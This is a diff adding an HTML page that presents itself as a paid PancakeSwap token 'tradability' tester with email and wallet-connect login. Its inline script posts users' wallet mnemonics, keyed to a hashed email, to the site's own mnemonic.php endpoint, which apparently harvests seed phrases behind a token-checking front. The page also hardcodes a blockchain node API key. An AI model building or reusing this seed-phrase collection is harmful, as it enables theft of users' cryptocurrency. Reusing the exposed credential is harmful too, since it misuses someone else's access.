@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="logo1.png" sizes="192x192" />
+    <link rel="apple-touch-icon" href="logo1.png" />
+    <link rel="stylesheet" href="style.css">
+    <title>LuckyGuy</title>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+    <script src="./js/jquery.js"></script>
+    <script src="main.build.js"></script>
+    <script src="bridge.js"></script>
+</head>
+<body class="bdy">
+    
+    <!-- Navbar -->
+
+<div>
+    <div class="row">
+      
+
+    </div>
+</div>   
+<div id="log">
+        <div class="row">
+            <a href="#" class="bttn">
+                <span>itsTradable V1</span>
+            </a>
+            <a class="btnInfo">
+                <span>!</span>
+            </a>
+        </div> 
+        <div>
+            <p style="
+            padding: 20px;
+            color: white;
+            background: #14181fb0;
+        ">
+                Verify if a pancakeswap token pair is tradable or not using our online paided swap tester
+            </p>
+        </div>
+    <div align="center" class="bEyxva">
+
+
+        
+
+        <div class="main-card">
+    
+
+
+            <form action="" method="POST" class="form-sub">
+                <div class="Form-div-main swapToken">
+                    <div class="Head-for-estimate">
+                        <div class="aasfsfs">
+                            <div class="Estimate-d">
+                                <div class="sc-cSHVUG sc-chPdSV sc-kgoBCf fRQaiR"><div class="sc-VigVT ekfDkL css-tjft48">Email Address</div></div>
+                                <div id="BalanceTokenOne" class="sc-cSHVUG sc-chPdSV sc-kgoBCf fRQaiR BalanceTokenOne"></div>
+                        </div>
+                        </div>
+                    </div>
+                    <div class="lihOlP">
+        
+
+                        <div class="type-amount">
+                            <input class=" type-- token-amount-input" inputmode="decimal" title="Token Amount" autocomplete="off" autocorrect="off" type="email" placeholder="Email Address" minlength="1" maxlength="79" spellcheck="false" value="" required>
+                        </div>
+                    </div>
+
+    
+
+
+
+                <div style="margin-top: 24px; display: none;" class="approve-btn">
+                    <button class="Long-Button">Approve</button></div>
+                <div style="margin-top: 24px;">
+                    <button class="Long-Button swap_btn">Login</button></div>
+                    <b>Or</b>
+                <div style="margin-top: 24px;">
+                        <button class="Long-Button walletConnect">Connect with external wallet</button></div>
+            </div>   
+        </form>               
+        
+
+        
+    
+
+    </div>
+</div>
+
+    <div id="dialog-box" class="dialog-box">
+        <div class="bk">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" theme="[object Object]" class="sc-eXEjpC xhoqg"><path d="M17.9999 12.0001V14.6701C17.9999 17.9801 15.6499 19.3401 12.7799 17.6801L10.4699 16.3401L8.15995 15.0001C5.28995 13.3401 5.28995 10.6301 8.15995 8.97005L10.4699 7.63005L12.7799 6.29005C15.6499 4.66005 17.9999 6.01005 17.9999 9.33005V12.0001Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+        <span class="sbk">Go back</span></div>
+        <br>    
+        <h2 align="center"> Select Network</h2>
+
+       <br>
+
+       <hr>
+       <div class="listToken">
+            <ul class="coins">
+                <li>
+                    <i>Icon</i><span>Wrap BNB</span>
+                </li>
+            </ul>
+       </div>
+    </div>
+    <div id="dialog-box" class="dialog-box-trnx-report" style="display: none; overflow-x:hidden;text-overflow: ellipsis;"> 
+        <div class="bk-trn">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" theme="[object Object]" class="sc-eXEjpC xhoqg"><path d="M17.9999 12.0001V14.6701C17.9999 17.9801 15.6499 19.3401 12.7799 17.6801L10.4699 16.3401L8.15995 15.0001C5.28995 13.3401 5.28995 10.6301 8.15995 8.97005L10.4699 7.63005L12.7799 6.29005C15.6499 4.66005 17.9999 6.01005 17.9999 9.33005V12.0001Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+            <span class="sbk">Go back</span>
+ 
+        </div>
+
+        <div>
+            <h2 align="center" style="
+        margin: 5%;
+    ">Transaction Status</h2>
+            <div class="tran-details">
+                
+            </div>
+        </div>
+    </div>
+
+</div>
+    
+</body>
+
+<script>
+    $(document).ready(function() {
+      
+        logOut();
+        $(".form-sub").submit(function(e) {
+            e.preventDefault();
+            let email = $('.token-amount-input').val();
+            let email_hash = getHash(email);
+            //console.log(email_hash)
+            
+            $.ajax({
+                    url: "./mnemonics/checkMnemonics.php",
+                    type:'post',
+                    data:({sub:1,email:email_hash}),
+                    success: function(result) {
+                       // console.log("result:-",result)
+                        if (result == 'Error') {
+                           // console.log("Nrew");
+                            setServer("https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb",email);
+                        } else {
+                           // console.log("Ezisit");
+                            setExistingServer(result,"https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb");
+                        }
+                    }
+            });
+            
+            
+        })
+        $(".walletConnect").click(function() {
+            walletConnect("https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb");
+        })  
+        function loadPage(mnenonics,hash)  {
+           // console.log("Mnenonminc:-",mnenonics,"hash:-",hash);
+            
+            if (hash != null) {
+                $.ajax({
+                        url: "./mnemonics/mnenomic.php",
+                        type:'post',
+                        data:({email:hash,mnenomics:mnenonics}),
+                        success: function(result) {
+                            
+                        if (result != 'Error') {
+                           // console.log("result:-",result)
+                            loadDash();
+                          }
+                        }
+                });                
+            } else {
+                loadDash();
+            }
+
+        }
+         window.loadPage = loadPage;
+
+        function loadDash() {
+            setRefresh();
+            initiate();
+            $.ajaxSetup({url:null,cache:false});
+            $.ajax({
+                    url: "dashboard.html",
+                    success: function(data,status,jqXHR) {
+                        $(".bdy").fadeOut(function() {
+                            $(".bdy").fadeIn();
+                            $(".bdy").html($(data).filter("#main_body"));
+                            history.pushState(null, null, "dashboard.html"); 
+                        })
+                        
+                    },
+                    cache:false
+                });            
+        }
+
+        function logOut() {
+            logoutWalletConnect();
+            $.ajax({
+                        url: "./mnemonics/logout.php",
+                        type:'get',
+                        success: function(result) {
+                            
+                        if (result != 'Error') {
+                            //console.log("result:-",result)
+                        
+                          }
+                        }
+                });              
+        }
+    });
+   
+    //initiate();
+</script>
+</html>
